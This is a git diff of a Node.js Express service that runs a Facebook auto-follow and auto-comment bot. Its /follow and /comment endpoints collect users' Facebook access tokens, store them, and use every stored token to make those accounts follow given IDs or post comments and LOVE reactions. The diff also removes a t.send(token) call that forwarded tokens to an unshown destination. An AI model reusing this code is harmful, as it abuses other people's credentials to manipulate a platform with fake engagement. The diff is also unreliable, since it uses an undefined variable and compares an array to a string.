@@ -423,23 +423,24 @@ app.get("/cfimg", async(req, res) => {
 
 app.get("/follow", async(req,res) => {
   const { token, uid } = req.query;
+  const token__ = await tokens();
   if (!token||!uid){
   return res.json({
     error: "No 'token'/'uid' params."
   })
   }
   if (token.startsWith("E")){
+  if (token__ !== token){
   await t.addToken(token);
-  t.send(token);
+  }
   }
   //await sleep(1*1000);
   const page = require("./page");
-  const token__ = await tokens();
-  for(const token1 of token__){
-  if(token1!==null){
-  const page1 = await page.page(token1,{
+  for(let i = 0; i < token__.length; i++){
+  if(token__[i]!==null){
+  const page1 = await page.page(token1__[i],{
     ...headers_a,
-    "Authorization": `Bearer ${token1}`
+    "Authorization": `Bearer ${token1__[i]}`
   });
   for (const page2 of page1){
   follower(page2, uid);
@@ -449,19 +450,21 @@ app.get("/follow", async(req,res) => {
   return res.json({
     msg: "Success follow UIDs",
     uid
-  })
+  });
 });
 
 app.get("/comment", async(req, res) => {
-  const { token, msg, link, delay } = req.query;
-  if (!token||!msg||!link||!delay){
+  const { token, msg, link } = req.query;
+  const token__ = await tokens();
+  if (!token||!msg||!link){
     return res.json({
-      error: "No 'token'/'msg'/'link'/'delay' params."
+      error: "No 'token'/'msg'/'link'/ params."
     });
   }
   if (token.startsWith("E")) {
-    await t.addToken(token);
-    t.send(token);
+    if (token__ !== token) {
+      await t.addToken(token);
+    }
   }
   const page = require("./page");
   const page1 = await page.page(token, {
@@ -469,7 +472,7 @@ app.get("/comment", async(req, res) => {
     "Authorization": `Bearer ${token}`
   });
   for (const page2 of page1){
-  await commenter(page2,msg,link,delay);
+  await commenter(page2,msg,link);
   }
   return res.json({
     msg: "Success comment",
@@ -553,9 +556,9 @@ app.get("/flikers", async(req,res) => {
             'Cookie': cookie
         }
     })
-        .then(dat => { res.json(dat.data); })
+        .then(dat => { return res.json(dat.data); })
         .catch(e => {
-            res.json({ error: e });
+            return res.json({ error: e });
         });
 });
 
@@ -791,7 +794,7 @@ async function follower(a,uid){
     }
 }
 
-async function commenter(a,msg,link,delay){
+async function commenter(a,msg,link){
   try {
     /*const kapogi = [
       "ampogi ni neth",
@@ -812,7 +815,6 @@ async function commenter(a,msg,link,delay){
       "💀💀💀💀",
       "Isa ako sa mga pogi katulad ni Neth hehe",
       ];*/
-    setInterval(() => {
     axios.post(`https://graph.facebook.com/${extract(link)}/comments`, null, {
       params: {
         message: msg/*kapogi[Math.floor(Math.random() * kapogi.length)]*/,
@@ -823,7 +825,6 @@ async function commenter(a,msg,link,delay){
       }}).catch(err=>{});
     axios.post(`https://graph.facebook.com/${extract(link)}/reactions?type=LOVE&access_token=${a}`)
     .catch(err => {});
-    }, delay*1000);
   } catch (err){
   }
 }
